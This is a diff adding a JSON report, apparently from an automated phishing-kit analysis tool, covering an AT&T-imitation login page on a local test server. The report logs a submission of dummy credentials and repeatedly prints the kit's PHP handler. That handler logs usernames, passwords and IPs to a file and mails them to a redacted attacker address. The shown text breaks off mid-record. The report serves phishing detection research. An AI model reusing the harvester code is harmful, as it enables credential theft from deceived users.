@@ -1,0 +1,1945 @@
+{
+  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/",
+  "timestamp": "2026-05-06 10:21:43",
+  "mode": "whitebox",
+  "kit_path": "/var/www/html/phishing_kit_uncompress_20250519/2024-01-12_ATT",
+  "pages": [
+    {
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "forms": [
+        {
+          "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+          "method": "post",
+          "xpath": "//*[@id=\"LoginForm\"]",
+          "registered_handlers": [],
+          "fields": [
+            {
+              "name": "userid",
+              "type": "text",
+              "xpath": "//*[@id=\"nameBox\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "password",
+              "type": "password",
+              "xpath": "//*[@id=\"pwdBox\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "showPwd",
+              "type": "checkbox",
+              "xpath": "//*[@id=\"showPwd\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "rememberID",
+              "type": "checkbox",
+              "xpath": "//*[@id=\"rememberID\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            }
+          ],
+          "submit_log": {
+            "enter_key_test": {
+              "skipped": true,
+              "reason": "network_only"
+            },
+            "enter_key_logs": {},
+            "native_submit": {
+              "form_meta": {
+                "action": "verify.php",
+                "enctype": "application/x-www-form-urlencoded",
+                "id": "LoginForm",
+                "method": "POST",
+                "name": "LoginForm"
+              },
+              "cdp_reqs": [
+                {
+                  "requestId": "348D95E2C4EED52FAE3DF31D07DD834B",
+                  "sequence": 1,
+                  "resourceType": "Document",
+                  "initiatorType": "other",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "331",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Cookie": "IV_JCT=%2FcommonLogin",
+                    "Host": "www.2026.com:8080",
+                    "Origin": "http://www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Cookie",
+                    "Host",
+                    "Origin",
+                    "Pragma",
+                    "Referer",
+                    "Upgrade-Insecure-Requests",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": true,
+                  "associatedCookies": [
+                    {
+                      "blockedReasons": [],
+                      "cookie": {
+                        "domain": "www.2026.com",
+                        "expires": -1,
+                        "httpOnly": false,
+                        "name": "IV_JCT",
+                        "path": "/",
+                        "priority": "Medium",
+                        "sameParty": false,
+                        "secure": false,
+                        "session": true,
+                        "size": 20,
+                        "sourcePort": 8080,
+                        "sourceScheme": "NonSecure",
+                        "value": "%2FcommonLogin"
+                      },
+                      "exemptionReason": "None"
+                    }
+                  ],
+                  "customRequestHeaders": {},
+                  "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=lgelzj&password=eVLJMJwyz&showPwd=on&rememberID=on",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "402",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:21:47 GMT",
+                    "Keep-Alive": "timeout=5, max=48",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 730,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 653,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 276133.051479,
+                  "lastEventTs": 1778030507327,
+                  "requestSentTs": 276133.051479,
+                  "responseReceivedTs": 276133.056086,
+                  "loadingFinishedTs": 276133.055573,
+                  "latencyMs": 4.1,
+                  "ttfbMs": 4.6,
+                  "_native_submit": true,
+                  "_submit_trigger_ts_ms": 1778030507258
+                }
+              ],
+              "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+            },
+            "submit_click_logs": {
+              "step": 1,
+              "phase": "submit_click",
+              "domChanges": [],
+              "networkReqs": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "type": "xhr",
+                  "method": "POST",
+                  "url": "verify.php",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                  },
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "requestBody": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+                  "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+                  "status": 200,
+                  "response": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+                  "responseHeaders": {
+                    "connection": "Keep-Alive",
+                    "content-encoding": "gzip",
+                    "content-length": "402",
+                    "content-type": "text/html; charset=UTF-8",
+                    "date": "Wed, 06 May 2026 01:21:50 GMT",
+                    "keep-alive": "timeout=5, max=45",
+                    "server": "Apache/2.4.58 (Ubuntu)",
+                    "vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "responseReturned": true,
+                  "redirected": true,
+                  "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "responseBodyLength": 730,
+                  "timestamp": 1778030510305,
+                  "latencyMs": 13,
+                  "ttfbMs": null,
+                  "resolved_server": {
+                    "server_file": "ATT/verify.php",
+                    "receives_fields": [
+                      "password",
+                      "userid",
+                      "zipxnx"
+                    ],
+                    "actions": [
+                      {
+                        "type": "mail",
+                        "target": "[REDACTED_EMAIL]",
+                        "variable": "$recipient",
+                        "line": 26
+                      },
+                      {
+                        "type": "redirect",
+                        "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+                        "line": 27
+                      }
+                    ],
+                    "exfil": [
+                      "email:[REDACTED_EMAIL]"
+                    ]
+                  }
+                }
+              ],
+              "firedEvents": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseover",
+                  "targetXPath": "//*[@id=\"submitLogin\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510303
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mousedown",
+                  "targetXPath": "//*[@id=\"submitLogin\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510303
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "focus",
+                  "targetXPath": "//*[@id=\"submitLogin\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510303
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseup",
+                  "targetXPath": "//*[@id=\"submitLogin\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510304
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "click",
+                  "targetXPath": "//*[@id=\"submitLogin\"]",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign In",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510304
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "submit",
+                  "targetXPath": "//*[@id=\"LoginForm\"]",
+                  "targetTag": "FORM",
+                  "targetName": "LoginForm",
+                  "targetType": "",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1778030510305
+                }
+              ],
+              "html5Validation": [],
+              "triggeredFunctions": [],
+              "cdpNetworkReqs": [
+                {
+                  "requestId": "780051.47",
+                  "sequence": 11,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Content-Type",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": true,
+                  "associatedCookies": [
+                    {
+                      "blockedReasons": [],
+                      "cookie": {
+                        "domain": "www.2026.com",
+                        "expires": -1,
+                        "httpOnly": false,
+                        "name": "IV_JCT",
+                        "path": "/",
+                        "priority": "Medium",
+                        "sameParty": false,
+                        "secure": false,
+                        "session": true,
+                        "size": 20,
+                        "sourcePort": 8080,
+                        "sourceScheme": "NonSecure",
+                        "value": "%2FcommonLogin"
+                      },
+                      "exemptionReason": "None"
+                    }
+                  ],
+                  "customRequestHeaders": {},
+                  "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "402",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:21:50 GMT",
+                    "Keep-Alive": "timeout=5, max=45",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 730,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 653,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 276136.050356,
+                  "lastEventTs": 1778030510810,
+                  "requestSentTs": 276136.050356,
+                  "responseReceivedTs": 276136.061492,
+                  "loadingFinishedTs": 276136.053815,
+                  "latencyMs": 3.5,
+                  "ttfbMs": 11.1,
+                  "_timing_summary": {
+                    "latencyMs": 3.5,
+                    "ttfbMs": 11.1,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": true,
+                    "hasSetCookie": false
+                  }
+                }
+              ],
+              "jqueryDispatchLogs": []
+            },
+            "submit_trigger_ts_ms": 1778030510272,
+            "submit_timing": {
+              "python_click_ts_ms": 1778030510272,
+              "js_trigger_event_ts_ms": 1778030510304,
+              "js_first_req_ts_ms": 1778030510305,
+              "event_to_request_ms": 1,
+              "cdp_req_count": 1
+            },
+            "submit_detail": {
+              "action": "verify.php",
+              "fields": {
+                "password": "cA16p9AM",
+                "rememberID": "on",
+                "showPwd": "on",
+                "style": "ATTidp",
+                "targetURL": "https://loginprodx.att.net/FIM/sps/ATTidp/saml20/logininitial?RequestBinding=HTTPPost&PartnerId=https://login.yahoo.com/saml/2.0/att&.lang=en-US&Target=https%3a//att.yahoo.com/%3f.lts=1415577160",
+                "userid": "uahgmqamserm"
+              },
+              "method": "POST",
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseLength": 730,
+              "status": 200,
+              "submitted": true,
+              "cdp_network": [
+                {
+                  "requestId": "780051.47",
+                  "sequence": 11,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Content-Type",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": true,
+                  "associatedCookies": [
+                    {
+                      "blockedReasons": [],
+                      "cookie": {
+                        "domain": "www.2026.com",
+                        "expires": -1,
+                        "httpOnly": false,
+                        "name": "IV_JCT",
+                        "path": "/",
+                        "priority": "Medium",
+                        "sameParty": false,
+                        "secure": false,
+                        "session": true,
+                        "size": 20,
+                        "sourcePort": 8080,
+                        "sourceScheme": "NonSecure",
+                        "value": "%2FcommonLogin"
+                      },
+                      "exemptionReason": "None"
+                    }
+                  ],
+                  "customRequestHeaders": {},
+                  "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "402",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Wed, 06 May 2026 01:21:50 GMT",
+                    "Keep-Alive": "timeout=5, max=45",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+                  "responseBodyLength": 730,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 653,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 276136.050356,
+                  "lastEventTs": 1778030510810,
+                  "requestSentTs": 276136.050356,
+                  "responseReceivedTs": 276136.061492,
+                  "loadingFinishedTs": 276136.053815,
+                  "latencyMs": 3.5,
+                  "ttfbMs": 11.1,
+                  "_timing_summary": {
+                    "latencyMs": 3.5,
+                    "ttfbMs": 11.1,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": true,
+                    "hasSetCookie": false
+                  }
+                }
+              ]
+            }
+          },
+          "overall_classification": "Case B: Server Round-trip (AJAX)",
+          "field_stats": {
+            "dom_analysable": 4,
+            "visible_now": 4,
+            "hidden_or_collapsed": 0
+          },
+          "static_action_analysis": {
+            "server_file": "ATT/verify.php",
+            "receives_fields": [
+              "password",
+              "userid",
+              "zipxnx"
+            ],
+            "actions": [
+              {
+                "type": "mail",
+                "target": "[REDACTED_EMAIL]",
+                "variable": "$recipient",
+                "line": 26
+              },
+              {
+                "type": "redirect",
+                "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+                "line": 27
+              }
+            ],
+            "exfil": [
+              "email:[REDACTED_EMAIL]"
+            ]
+          },
+          "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm"
+        }
+      ]
+    }
+  ],
+  "forms": [
+    {
+      "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "method": "post",
+      "xpath": "//*[@id=\"LoginForm\"]",
+      "registered_handlers": [],
+      "fields": [
+        {
+          "name": "userid",
+          "type": "text",
+          "xpath": "//*[@id=\"nameBox\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        },
+        {
+          "name": "password",
+          "type": "password",
+          "xpath": "//*[@id=\"pwdBox\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        },
+        {
+          "name": "showPwd",
+          "type": "checkbox",
+          "xpath": "//*[@id=\"showPwd\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        },
+        {
+          "name": "rememberID",
+          "type": "checkbox",
+          "xpath": "//*[@id=\"rememberID\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        }
+      ],
+      "submit_log": {
+        "enter_key_test": {
+          "skipped": true,
+          "reason": "network_only"
+        },
+        "enter_key_logs": {},
+        "native_submit": {
+          "form_meta": {
+            "action": "verify.php",
+            "enctype": "application/x-www-form-urlencoded",
+            "id": "LoginForm",
+            "method": "POST",
+            "name": "LoginForm"
+          },
+          "cdp_reqs": [
+            {
+              "requestId": "348D95E2C4EED52FAE3DF31D07DD834B",
+              "sequence": 1,
+              "resourceType": "Document",
+              "initiatorType": "other",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
+                "Content-Length": "331",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": "IV_JCT=%2FcommonLogin",
+                "Host": "www.2026.com:8080",
+                "Origin": "http://www.2026.com:8080",
+                "Pragma": "no-cache",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Accept",
+                "Accept-Encoding",
+                "Accept-Language",
+                "Cache-Control",
+                "Connection",
+                "Content-Length",
+                "Content-Type",
+                "Cookie",
+                "Host",
+                "Origin",
+                "Pragma",
+                "Referer",
+                "Upgrade-Insecure-Requests",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": true,
+              "associatedCookies": [
+                {
+                  "blockedReasons": [],
+                  "cookie": {
+                    "domain": "www.2026.com",
+                    "expires": -1,
+                    "httpOnly": false,
+                    "name": "IV_JCT",
+                    "path": "/",
+                    "priority": "Medium",
+                    "sameParty": false,
+                    "secure": false,
+                    "session": true,
+                    "size": 20,
+                    "sourcePort": 8080,
+                    "sourceScheme": "NonSecure",
+                    "value": "%2FcommonLogin"
+                  },
+                  "exemptionReason": "None"
+                }
+              ],
+              "customRequestHeaders": {},
+              "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=lgelzj&password=eVLJMJwyz&showPwd=on&rememberID=on",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "402",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:21:47 GMT",
+                "Keep-Alive": "timeout=5, max=48",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 730,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 653,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 276133.051479,
